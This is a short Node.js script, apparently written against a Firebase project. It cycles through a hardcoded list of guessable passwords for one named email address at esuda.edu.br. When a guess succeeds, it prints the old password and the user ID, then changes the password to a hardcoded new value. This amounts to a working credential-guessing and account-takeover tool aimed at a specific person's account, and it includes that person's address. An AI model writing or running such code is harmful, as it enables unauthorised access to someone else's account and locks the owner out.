const path = require('path');
const { initializeApp } = require('firebase/app');
const { getAuth, signInWithEmailAndPassword, updatePassword } = require('firebase/auth');
const config = require(path.join(__dirname, '../firebase-applet-config.json'));

const app = initializeApp(config);
const auth = getAuth(app);

const TARGET_EMAIL = 'emanoel@esuda.edu.br';
const DESIRED_PASS = '3443*/A';

const candidates = [
  '123456',
  '12345678',
  'admin123',
  'admin1234',
  'esuda123',
  'esuda2024',
  'esuda2025',
  'esuda2026',
  'Esuda@2024',
  'Esuda@2025',
  'Esuda@2026',
  '3443*/a',
  '3443*A',
  '3443*/A',
  'Emanoel@2024',
  'Emanoel@2025',
  'Emanoel@2026',
  'emanoel123',
  'amorim123',
  'esuda@123',
  'posgraduacao',
  'posgraduacao123',
  'secret',
  'password'
];

async function tryCandidates() {
  for (const p of candidates) {
    try {
      const res = await signInWithEmailAndPassword(auth, TARGET_EMAIL, p);
      console.log(`\n===> SUCESSO! Senha anterior era: "${p}" <===`);
      console.log(`UID: ${res.user.uid}`);
      
      // Agora atualizar para a senha desejada: 3443*/A
      await updatePassword(res.user, DESIRED_PASS);
      console.log(`===> Senha atualizada com sucesso para: "${DESIRED_PASS}"! <===`);
      return true;
    } catch (e) {
      if (e.code === 'auth/wrong-password' || e.code === 'auth/invalid-credential') {
        // next
      } else {
        console.log(`Erro para senha "${p}":`, e.code);
      }
    }
  }
  return false;
}

tryCandidates()
  .then(found => {
    if (!found) console.log('Nenhuma das senhas candidatas funcionou.');
    process.exit(found ? 0 : 1);
  })
  .catch(e => {
    console.error(e);
    process.exit(1);
  });
